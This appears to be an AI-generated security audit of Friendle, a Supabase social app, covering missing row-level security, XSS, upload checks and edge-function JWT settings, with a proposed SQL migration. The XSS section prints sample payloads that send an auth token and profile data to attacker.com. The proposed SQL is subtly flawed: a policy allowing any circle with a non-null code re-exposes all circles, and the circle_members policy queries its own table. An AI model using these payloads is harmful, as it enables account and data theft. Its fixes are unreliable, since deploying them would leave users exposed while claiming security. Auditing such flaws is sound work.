# Friendle Security Audit Report
**Date:** October 24, 2025
**Auditor:** Claude (Automated Security Analysis)
**Project:** Friendle - Activity Matching Social Network
**Supabase Project:** friendle_dev

---

## Executive Summary

This security audit examined the Friendle application for vulnerabilities related to Row Level Security (RLS), input validation, authentication, and privacy controls. The audit identified **3 critical vulnerabilities**, **4 high-priority issues**, and **5 medium-priority issues** that require immediate attention.

### Overall Security Rating: ⚠️ **REQUIRES IMMEDIATE ATTENTION**

---

## 1. Row Level Security (RLS) Policies

### ✅ **SECURE: Circle Messages**
**Location:** `MIGRATION_add_circle_chat.sql:35-66`

**Finding:** Circle messages are properly protected with comprehensive RLS policies:
- ✅ Users can only read messages from circles they're members of
- ✅ Users can only insert messages to circles they belong to
- ✅ Users can only update/delete their own messages
- ✅ Proper verification using `auth.uid()` and circle membership checks

```sql
-- Excellent example of proper RLS
CREATE POLICY "Users can read circle messages if they are circle members"
ON circle_messages FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = circle_messages.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);
```

---

### ✅ **SECURE: Match & Event Messages**
**Location:** `MIGRATION_add_message_crud_policies.sql`

**Finding:** Match and event messages have proper UPDATE/DELETE policies:
- ✅ Users can only update their own messages
- ✅ Users can only delete their own messages
- ✅ Proper use of `sender_id = auth.uid()` validation

---

### ✅ **SECURE: Message Reactions**
**Location:** `MIGRATION_add_message_reactions.sql:61-138`

**Finding:** Reaction policies are well-designed:
- ✅ Users can only read reactions on messages they can access
- ✅ Users can only add reactions with their own profile_id
- ✅ Users can only delete their own reactions
- ✅ Proper circle membership checks for circle message reactions

---

### ✅ **SECURE: Storage/Avatar Policies**
**Location:** `MIGRATION_add_profile_pictures.sql:16-52`

**Finding:** Storage policies are properly configured:
- ✅ Users can only upload to their own folder (`{user_id}/avatar.*`)
- ✅ Users can only update/delete their own avatars
- ✅ Public read access for avatars (intentional design)
- ✅ Proper path validation using `storage.foldername(name))`

---

### 🔴 **CRITICAL: Missing RLS Policies for Core Tables**

#### **Issue #1: No RLS Policies Found for Primary Tables**
**Severity:** 🔴 **CRITICAL**
**Impact:** Potential unauthorized data access

**Missing RLS on:**
1. **`profiles` table** - No policies found in migrations
2. **`circles` table** - No policies found in migrations
3. **`circle_members` table** - No policies found in migrations
4. **`matches` table** - No policies found in migrations
5. **`match_participants` table** - No policies found in migrations
6. **`events` table** - No policies found in migrations
7. **`event_participants` table** - No policies found in migrations
8. **`preferences` table** - No policies found in migrations
9. **`activities` table** - No policies found in migrations
10. **`inactivity_warnings` table** - No policies found in migrations
11. **`muted_chats` table** - No policies found in migrations

**Vulnerability Details:**
Without RLS policies on these tables, the client-side JavaScript code relies entirely on application-level access control. If an attacker bypasses the client (using Supabase API directly), they could:
- Read all profiles in the database
- Read circles they're not members of
- Read matches they're not part of
- Read events in circles they haven't joined
- Modify other users' preferences
- Access inactivity warnings for other users

**Evidence from Code:**
The client code attempts to filter data client-side, but without RLS, attackers can bypass this:

```javascript
// index.html:2575 - Client-side filtering (bypassable without RLS)
const { data: circle } = await supabase
    .from('circles')
    .select('*')
    .eq('code', inviteCode)
    .single();
```

Without RLS on `circles`, any authenticated user could query ALL circles by removing the `.eq()` filter.

---

#### **Issue #2: Profile Data Access**
**Severity:** 🔴 **CRITICAL**
**Location:** `index.html:2260, 3136, 3341, etc.`

**Vulnerability:** Users can potentially access and modify any profile without RLS.

**Observed Queries:**
```javascript
// Multiple queries that could expose all profiles
.from('profiles')
.select('*')
.eq('id', session.user.id)
```

**Required Policies:**
```sql
-- Users can read their own profile
CREATE POLICY "Users can read own profile"
ON profiles FOR SELECT
USING (auth.uid() = id);

-- Users can update their own profile
CREATE POLICY "Users can update own profile"
ON profiles FOR UPDATE
USING (auth.uid() = id)
WITH CHECK (auth.uid() = id);

-- Users can read profiles of circle members
CREATE POLICY "Users can read circle member profiles"
ON profiles FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members cm1
    JOIN circle_members cm2 ON cm1.circle_id = cm2.circle_id
    WHERE cm1.profile_id = auth.uid()
    AND cm2.profile_id = profiles.id
  )
);
```

---

#### **Issue #3: Circle Access Control**
**Severity:** 🔴 **CRITICAL**
**Location:** `index.html:3855, 3762, 4112`

**Vulnerability:** Without RLS on `circles` and `circle_members` tables, users could:
- Query all circles in the system
- Access circle details without being a member
- Potentially join circles without valid invite codes

**Required Policies:**
```sql
-- Circles: Users can only read circles they're members of
CREATE POLICY "Users can read their circles"
ON circles FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = circles.id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Circles: Only creators can update/delete
CREATE POLICY "Creators can manage circles"
ON circles FOR UPDATE
USING (created_by = auth.uid());

CREATE POLICY "Creators can delete circles"
ON circles FOR DELETE
USING (created_by = auth.uid());

-- Circle members: Users can read members of their circles
CREATE POLICY "Users can read circle members"
ON circle_members FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members cm
    WHERE cm.circle_id = circle_members.circle_id
    AND cm.profile_id = auth.uid()
  )
);

-- Circle members: Users can join circles (INSERT their own membership)
CREATE POLICY "Users can join circles"
ON circle_members FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Circle members: Users can leave circles (DELETE their own membership)
CREATE POLICY "Users can leave circles"
ON circle_members FOR DELETE
USING (profile_id = auth.uid());
```

---

#### **Issue #4: Match and Event Access**
**Severity:** 🔴 **CRITICAL**
**Location:** `index.html:4051, 4100, 6774`

**Vulnerability:** Users could query matches and events from circles they're not in.

**Required Policies:**
```sql
-- Matches: Only visible to circle members
CREATE POLICY "Circle members can read matches"
ON matches FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = matches.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Events: Only visible to circle members
CREATE POLICY "Circle members can read events"
ON events FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = events.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Event participants: Users can join events
CREATE POLICY "Users can join events"
ON event_participants FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Event participants: Users can update their own participation
CREATE POLICY "Users can update own participation"
ON event_participants FOR UPDATE
USING (profile_id = auth.uid());
```

---

## 2. Input Validation & XSS Protection

### 🟠 **HIGH: XSS Vulnerability in Message Rendering**
**Severity:** 🟠 **HIGH**
**Location:** `index.html:8638, 8726, 8738`

**Vulnerability:** Messages are rendered directly into innerHTML without sanitization:

```javascript
// Line 8638 - Unsanitized message content
messageDiv.innerHTML = `
    ...
    <div>
        ${content}  // ❌ NO SANITIZATION
    </div>
`;

// Line 8738 - Direct content injection
${message.content}  // ❌ NO SANITIZATION
```

**Attack Vector:**
A malicious user could send messages containing:
```javascript
<script>
  // Steal auth tokens
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('friendle_user')
    })
  });
</script>

<img src=x onerror="
  // Access sensitive data
  supabase.from('profiles').select('*').then(d =>
    fetch('https://attacker.com/data', {method: 'POST', body: JSON.stringify(d)})
  )
">
```

**Recommendation:**
1. **Sanitize all user input** before rendering:
```javascript
function sanitizeHTML(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// Then use:
messageDiv.innerHTML = `
    <div>
        ${sanitizeHTML(content)}  // ✅ SAFE
    </div>
`;
```

2. **Or use textContent instead of innerHTML:**
```javascript
const contentDiv = document.createElement('div');
contentDiv.textContent = message.content;  // ✅ SAFE - auto-escapes
```

---

### 🟡 **MEDIUM: Limited File Upload Validation**
**Severity:** 🟡 **MEDIUM**
**Location:** `index.html:3285-3300`

**Current Validation:**
```javascript
// ✅ Type validation (basic)
if (!file.type.startsWith('image/')) {
    return showNotification('Please select an image file', 'error');
}

// ✅ Size validation (5MB limit)
if (file.size > 5 * 1024 * 1024) {
    return showNotification('Image must be less than 5MB', 'error');
}
```

**Issues:**
1. **MIME type can be spoofed** - relies on client-provided `file.type`
2. **No file extension whitelist** - allows `.svg` which can contain JavaScript
3. **No image dimension validation** - could allow extremely large dimensions (memory attacks)
4. **No file content validation** - doesn't verify file is actually an image

**Recommendations:**
```javascript
// 1. Whitelist specific extensions
const allowedExtensions = ['jpg', 'jpeg', 'png', 'webp'];
const fileExt = file.name.split('.').pop().toLowerCase();
if (!allowedExtensions.includes(fileExt)) {
    return showNotification('Only JPG, PNG, and WebP images allowed', 'error');
}

// 2. Verify image dimensions
const img = new Image();
img.onload = function() {
    if (this.width > 4096 || this.height > 4096) {
        return showNotification('Image dimensions too large', 'error');
    }
};
img.src = URL.createObjectURL(file);

// 3. Add server-side validation in Supabase Storage policies
```

---

### 🟡 **MEDIUM: No Rate Limiting on File Uploads**
**Severity:** 🟡 **MEDIUM**
**Location:** `index.html:3285`

**Vulnerability:** No client-side or server-side rate limiting on profile picture uploads.

**Attack Scenario:**
- Attacker uploads 1000s of 5MB files rapidly
- Fills storage quota
- Creates DoS condition

**Recommendation:**
Implement rate limiting at Supabase level or add client-side throttling.

---

### ✅ **SECURE: Invite Code Validation**
**Location:** `index.html:2570-2598`

**Finding:** Invite codes are properly validated:
- ✅ Checks if circle exists before allowing join
- ✅ Prevents duplicate membership
- ✅ Trims input to prevent whitespace issues

---

## 3. Authentication & Session Management

### 🟠 **HIGH: Hardcoded Supabase Credentials**
**Severity:** 🟠 **HIGH** (by design, but requires proper RLS)
**Location:** `index.html:1390-1391`

**Finding:**
```javascript
const SUPABASE_URL = "https://kxsewkjbhxtfqbytftbu.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
```

**Analysis:**
This is **expected** for Supabase anon key (it's meant to be public), **BUT** requires proper RLS policies to be secure. Since RLS policies are missing on core tables, this becomes a critical vulnerability.

**Decoded Anon Key:**
```json
{
  "iss": "supabase",
  "ref": "kxsewkjbhxtfqbytftbu",
  "role": "anon",
  "iat": 1758851884,
  "exp": 2074427884
}
```

**Status:** This is secure IF AND ONLY IF all RLS policies are properly implemented (currently NOT the case).

---

### ✅ **SECURE: Password Reset Flow**
**Location:** `index.html:2317-2343, 2229-2299`

**Finding:** Password reset flow is properly implemented:
- ✅ Uses Supabase's built-in `resetPasswordForEmail` method
- ✅ Requires email verification
- ✅ Password change requires valid reset token
- ✅ Minimum 6 character password requirement
- ✅ Password confirmation check
- ✅ Proper session handling after reset

```javascript
// Secure password reset
const { error } = await supabase.auth.resetPasswordForEmail(email, {
    redirectTo: window.location.origin
});
```

---

### ✅ **SECURE: Session Management**
**Location:** `index.html:1396-1413`

**Finding:** Session management uses Supabase's built-in auth:
- ✅ Uses `onAuthStateChange` for automatic session refresh
- ✅ Tokens automatically refreshed by Supabase client
- ✅ Proper logout handling
- ✅ Session stored securely by Supabase (not in localStorage directly)

---

### 🟡 **MEDIUM: Sensitive User Data in localStorage**
**Severity:** 🟡 **MEDIUM**
**Location:** `index.html:1497, 2268, 3349`

**Vulnerability:** User profile data stored in localStorage:
```javascript
localStorage.setItem('friendle_user', JSON.stringify(currentUser));
```

**Risk:**
- localStorage is accessible to any JavaScript (including XSS attacks)
- Data persists even after logout
- No encryption

**Recommendation:**
1. Only store user ID and minimal data in localStorage
2. Fetch full profile from server when needed
3. Clear localStorage on logout
4. Consider sessionStorage instead (cleared on tab close)

---

## 4. Privacy & Data Access Controls

### 🔴 **CRITICAL: No Privacy Controls on Data Queries**

Due to missing RLS policies, the following privacy violations are possible:

#### **Issue #5: Users Can Access Other Users' Data**
**Severity:** 🔴 **CRITICAL**
**Location:** Multiple query locations

**Without RLS, attackers can:**

```javascript
// Attacker code - Get ALL profiles
const { data } = await supabase
    .from('profiles')
    .select('*');
// Returns ALL users without filtering

// Get ALL circles
const { data } = await supabase
    .from('circles')
    .select('*');
// Returns ALL circles, not just user's circles

// Get ALL matches
const { data } = await supabase
    .from('matches')
    .select('*');
// Returns ALL matches across ALL circles
```

---

### 🟠 **HIGH: Message Deletion Not Truly Permanent**
**Severity:** 🟠 **HIGH**
**Location:** `index.html:7723-7776`

**Finding:** Messages are deleted using DELETE queries:
```javascript
await supabase
    .from('event_messages')
    .delete()
    .eq('id', msgId)
    .eq('sender_id', currentUser.id);
```

**Issue:**
- Supabase may retain deleted data in backups
- No "soft delete" with privacy flag
- Reactions are cascaded via foreign key, but may remain in backups

**Recommendation:**
If true privacy is required:
1. Implement soft deletes with `is_deleted` flag
2. Replace message content with "[Deleted]" instead of removing row
3. Document data retention policy
4. Consider GDPR compliance requirements

---

### 🟡 **MEDIUM: No Location Data Found**
**Severity:** 🟡 **MEDIUM**

**Finding:** No location tracking detected in the codebase. This is actually **good** from a privacy perspective.

**Recommendation:** If location features are added in the future, ensure:
- Explicit user consent
- Location data encrypted at rest
- Limited retention period
- User can delete location history

---

### ✅ **SECURE: Muted Chats Respected**
**Location:** `supabase/functions/send-notification/index.ts:131-156`

**Finding:** Notification system properly respects muted chats:
```typescript
// Filters out muted recipients
const { data: mutedChats } = await muteQuery
if (mutedChats && mutedChats.length > 0) {
    const mutedProfileIds = new Set(mutedChats.map(m => m.profile_id))
    filteredRecipients = filteredRecipients.filter(r => !mutedProfileIds.has(r.id))
}
```

---

### ✅ **SECURE: Notification Preferences Respected**
**Location:** `supabase/functions/send-notification/index.ts:103-126`

**Finding:** Users can control notification types:
- ✅ `notify_new_matches` preference checked
- ✅ `notify_event_joins` preference checked
- ✅ `notify_chat_messages` preference checked
- ✅ Users without OneSignal player ID don't receive notifications

---

## 5. Edge Function Security

### 🟠 **HIGH: Edge Functions Disable JWT Verification**
**Severity:** 🟠 **HIGH**
**Location:** `supabase/config.toml`

**Finding:**
```toml
[functions.inactivity-cleanup]
verify_jwt = false

[functions.stay-interested]
verify_jwt = false

[functions.event-reminders]
verify_jwt = false
```

**Analysis:**
- `inactivity-cleanup` and `event-reminders` are cron jobs (JWT disabled is acceptable)
- `stay-interested` is called by clients but has JWT disabled ❌

**Vulnerability in stay-interested:**
Without JWT verification, anyone could call the function and manipulate any user's interaction timestamp:

```javascript
// Attacker can reset anyone's inactivity
await fetch('https://[project].supabase.co/functions/v1/stay-interested', {
    method: 'POST',
    body: JSON.stringify({
        matchId: 'target-match-id',
        profileId: 'victim-user-id'  // ❌ Can spoof any user
    })
});
```

**Recommendation:**
```toml
[functions.stay-interested]
verify_jwt = true  # ✅ Enable JWT verification
```

Then validate the requesting user matches the profileId:
```typescript
// In stay-interested/index.ts
const authHeader = req.headers.get('Authorization')
const jwt = authHeader?.replace('Bearer ', '')
const { data: { user } } = await supabase.auth.getUser(jwt)

if (user.id !== profileId) {
    return new Response(JSON.stringify({
        success: false,
        error: 'Unauthorized: cannot update other users'
    }), { status: 403 })
}
```

---

### ✅ **SECURE: send-notification CORS Configuration**
**Location:** `supabase/functions/send-notification/index.ts:11-15`

**Finding:** Proper CORS headers allow client-side calls:
```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}
```

**Note:** While `*` is broad, this is acceptable for a notification service. Consider restricting to your domain in production.

---

## Critical Vulnerabilities Summary

| # | Severity | Issue | Impact | Location |
|---|----------|-------|--------|----------|
| 1 | 🔴 CRITICAL | Missing RLS on `profiles` table | Users can access all profiles | N/A - No policies exist |
| 2 | 🔴 CRITICAL | Missing RLS on `circles` table | Users can access all circles | N/A - No policies exist |
| 3 | 🔴 CRITICAL | Missing RLS on `matches` table | Users can access all matches | N/A - No policies exist |
| 4 | 🟠 HIGH | XSS vulnerability in messages | JavaScript injection, data theft | index.html:8638, 8726 |
| 5 | 🟠 HIGH | JWT disabled on client-called function | User impersonation | supabase/config.toml:6 |

---

## Recommended Remediation Priority

### **Phase 1: Immediate (Critical) - Deploy Within 24 Hours**

1. **Implement RLS policies for all core tables** (profiles, circles, circle_members, matches, events, etc.)
2. **Enable JWT verification** for `stay-interested` Edge Function
3. **Fix XSS vulnerability** in message rendering

### **Phase 2: Urgent (High) - Deploy Within 1 Week**

1. **Improve file upload validation** (extension whitelist, dimension checks)
2. **Add server-side rate limiting** for file uploads
3. **Review localStorage usage** and minimize stored data

### **Phase 3: Important (Medium) - Deploy Within 1 Month**

1. **Implement proper message deletion** strategy (soft delete vs hard delete)
2. **Add rate limiting** on API endpoints
3. **Security audit** of Edge Functions

---

## SQL Migration File: Complete RLS Implementation

Create a new migration file `MIGRATION_add_rls_policies_all_tables.sql` with the following policies:

```sql
-- ========================================
-- CRITICAL SECURITY FIX: Add RLS Policies
-- ========================================

-- Enable RLS on all tables
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE circles ENABLE ROW LEVEL SECURITY;
ALTER TABLE circle_members ENABLE ROW LEVEL SECURITY;
ALTER TABLE matches ENABLE ROW LEVEL SECURITY;
ALTER TABLE match_participants ENABLE ROW LEVEL SECURITY;
ALTER TABLE events ENABLE ROW LEVEL SECURITY;
ALTER TABLE event_participants ENABLE ROW LEVEL SECURITY;
ALTER TABLE preferences ENABLE ROW LEVEL SECURITY;
ALTER TABLE activities ENABLE ROW LEVEL SECURITY;
ALTER TABLE inactivity_warnings ENABLE ROW LEVEL SECURITY;
ALTER TABLE muted_chats ENABLE ROW LEVEL SECURITY;

-- ========== PROFILES ==========

-- Users can read their own profile
CREATE POLICY "Users can read own profile"
ON profiles FOR SELECT
USING (auth.uid() = id);

-- Users can update their own profile only
CREATE POLICY "Users can update own profile"
ON profiles FOR UPDATE
USING (auth.uid() = id)
WITH CHECK (auth.uid() = id);

-- Users can read profiles of people in their circles
CREATE POLICY "Users can read circle member profiles"
ON profiles FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members cm1
    JOIN circle_members cm2 ON cm1.circle_id = cm2.circle_id
    WHERE cm1.profile_id = auth.uid()
    AND cm2.profile_id = profiles.id
  )
);

-- Users can insert their own profile during signup
CREATE POLICY "Users can insert own profile"
ON profiles FOR INSERT
WITH CHECK (auth.uid() = id);

-- ========== CIRCLES ==========

-- Users can read circles they're members of
CREATE POLICY "Users can read their circles"
ON circles FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = circles.id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Users can read circles by invite code (for joining)
CREATE POLICY "Users can read circles by code"
ON circles FOR SELECT
USING (code IS NOT NULL);

-- Users can create circles
CREATE POLICY "Users can create circles"
ON circles FOR INSERT
WITH CHECK (created_by = auth.uid());

-- Only circle creators can update circles
CREATE POLICY "Creators can update circles"
ON circles FOR UPDATE
USING (created_by = auth.uid())
WITH CHECK (created_by = auth.uid());

-- Only circle creators can delete circles
CREATE POLICY "Creators can delete circles"
ON circles FOR DELETE
USING (created_by = auth.uid());

-- ========== CIRCLE_MEMBERS ==========

-- Users can read members of circles they belong to
CREATE POLICY "Users can read circle members"
ON circle_members FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members cm
    WHERE cm.circle_id = circle_members.circle_id
    AND cm.profile_id = auth.uid()
  )
);

-- Users can insert themselves as circle members
CREATE POLICY "Users can join circles"
ON circle_members FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Users can remove themselves from circles
CREATE POLICY "Users can leave circles"
ON circle_members FOR DELETE
USING (profile_id = auth.uid());

-- Circle creators can remove members
CREATE POLICY "Creators can remove members"
ON circle_members FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM circles
    WHERE circles.id = circle_members.circle_id
    AND circles.created_by = auth.uid()
  )
);

-- ========== MATCHES ==========

-- Users can read matches for circles they're in
CREATE POLICY "Circle members can read matches"
ON matches FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = matches.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- System can create matches (via triggers or admin)
-- Note: In production, restrict this to service role only
GRANT INSERT ON matches TO authenticated;

-- ========== MATCH_PARTICIPANTS ==========

-- Users can read participants for matches in their circles
CREATE POLICY "Users can read match participants"
ON match_participants FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM matches m
    JOIN circle_members cm ON cm.circle_id = m.circle_id
    WHERE m.id = match_participants.match_id
    AND cm.profile_id = auth.uid()
  )
);

-- Users can join matches (insert themselves)
CREATE POLICY "Users can join matches"
ON match_participants FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Users can update their own participation
CREATE POLICY "Users can update own participation"
ON match_participants FOR UPDATE
USING (profile_id = auth.uid())
WITH CHECK (profile_id = auth.uid());

-- Users can leave matches
CREATE POLICY "Users can leave matches"
ON match_participants FOR DELETE
USING (profile_id = auth.uid());

-- ========== EVENTS ==========

-- Users can read events for circles they're in
CREATE POLICY "Circle members can read events"
ON events FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = events.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Users can create events in their circles
CREATE POLICY "Circle members can create events"
ON events FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = events.circle_id
    AND circle_members.profile_id = auth.uid()
  )
  AND created_by = auth.uid()
);

-- Event creators can update their events
CREATE POLICY "Creators can update events"
ON events FOR UPDATE
USING (created_by = auth.uid())
WITH CHECK (created_by = auth.uid());

-- Event creators can delete their events
CREATE POLICY "Creators can delete events"
ON events FOR DELETE
USING (created_by = auth.uid());

-- ========== EVENT_PARTICIPANTS ==========

-- Users can read participants for events in their circles
CREATE POLICY "Users can read event participants"
ON event_participants FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM events e
    JOIN circle_members cm ON cm.circle_id = e.circle_id
    WHERE e.id = event_participants.event_id
    AND cm.profile_id = auth.uid()
  )
);

-- Users can join events
CREATE POLICY "Users can join events"
ON event_participants FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Users can update their own participation
CREATE POLICY "Users can update own event participation"
ON event_participants FOR UPDATE
USING (profile_id = auth.uid())
WITH CHECK (profile_id = auth.uid());

-- Users can leave events
CREATE POLICY "Users can leave events"
ON event_participants FOR DELETE
USING (profile_id = auth.uid());

-- ========== PREFERENCES ==========

-- Users can read preferences for circles they're in
CREATE POLICY "Users can read circle preferences"
ON preferences FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = preferences.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Users can manage their own preferences
CREATE POLICY "Users can insert own preferences"
ON preferences FOR INSERT
WITH CHECK (profile_id = auth.uid());

CREATE POLICY "Users can update own preferences"
ON preferences FOR UPDATE
USING (profile_id = auth.uid())
WITH CHECK (profile_id = auth.uid());

CREATE POLICY "Users can delete own preferences"
ON preferences FOR DELETE
USING (profile_id = auth.uid());

-- ========== ACTIVITIES ==========

-- Users can read activities for their circles
CREATE POLICY "Users can read circle activities"
ON activities FOR SELECT
USING (
  circle_id IS NULL OR -- Global activities
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = activities.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- Users can create custom activities for their circles
CREATE POLICY "Users can create circle activities"
ON activities FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM circle_members
    WHERE circle_members.circle_id = activities.circle_id
    AND circle_members.profile_id = auth.uid()
  )
);

-- ========== INACTIVITY_WARNINGS ==========

-- Users can only read their own warnings
CREATE POLICY "Users can read own warnings"
ON inactivity_warnings FOR SELECT
USING (profile_id = auth.uid());

-- System can insert warnings (service role only)
-- Users cannot manipulate warnings directly

-- ========== MUTED_CHATS ==========

-- Users can read their own muted chats
CREATE POLICY "Users can read own muted chats"
ON muted_chats FOR SELECT
USING (profile_id = auth.uid());

-- Users can mute chats
CREATE POLICY "Users can mute chats"
ON muted_chats FOR INSERT
WITH CHECK (profile_id = auth.uid());

-- Users can unmute chats
CREATE POLICY "Users can unmute chats"
ON muted_chats FOR DELETE
USING (profile_id = auth.uid());

-- ========================================
-- Grant necessary permissions
-- ========================================

GRANT SELECT, INSERT, UPDATE ON profiles TO authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON circles TO authenticated;
GRANT SELECT, INSERT, DELETE ON circle_members TO authenticated;
GRANT SELECT ON matches TO authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON match_participants TO authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON events TO authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON event_participants TO authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON preferences TO authenticated;
GRANT SELECT, INSERT ON activities TO authenticated;
GRANT SELECT ON inactivity_warnings TO authenticated;
GRANT SELECT, INSERT, DELETE ON muted_chats TO authenticated;

-- ========================================
-- Verification
-- ========================================

SELECT schemaname, tablename, policyname
FROM pg_policies
WHERE tablename IN (
    'profiles', 'circles', 'circle_members', 'matches',
    'match_participants', 'events', 'event_participants',
    'preferences', 'activities', 'inactivity_warnings', 'muted_chats'
)
ORDER BY tablename, policyname;
```

---

## Testing Recommendations

After implementing RLS policies, test the following scenarios:

### **Test 1: Unauthorized Circle Access**
```javascript
// As User A, try to access User B's circle
const { data, error } = await supabase
    .from('circles')
    .select('*')
    .eq('id', 'user-b-circle-id');

// Expected: error or empty data (should NOT return circle)
```

### **Test 2: Unauthorized Profile Access**
```javascript
// Try to access another user's profile
const { data, error } = await supabase
    .from('profiles')
    .select('*')
    .neq('id', currentUser.id);

// Expected: Should only return profiles of circle members
```

### **Test 3: Message Access Control**
```javascript
// Try to read messages from a circle you're not in
const { data, error } = await supabase
    .from('circle_messages')
    .select('*')
    .eq('circle_id', 'foreign-circle-id');

// Expected: Empty array or error
```

---

## Conclusion

The Friendle application has a solid foundation with proper RLS policies on message and storage tables. However, **critical vulnerabilities exist due to missing RLS policies on core tables** (profiles, circles, matches, events).

**Immediate action required:**
1. Deploy the RLS migration SQL file
2. Fix XSS vulnerability in message rendering
3. Enable JWT verification on stay-interested function

Once these critical issues are addressed, the application will have a strong security posture suitable for production use.

---

**Report Generated:** 2025-10-24
**Next Audit Recommended:** After implementing all critical and high-priority fixes
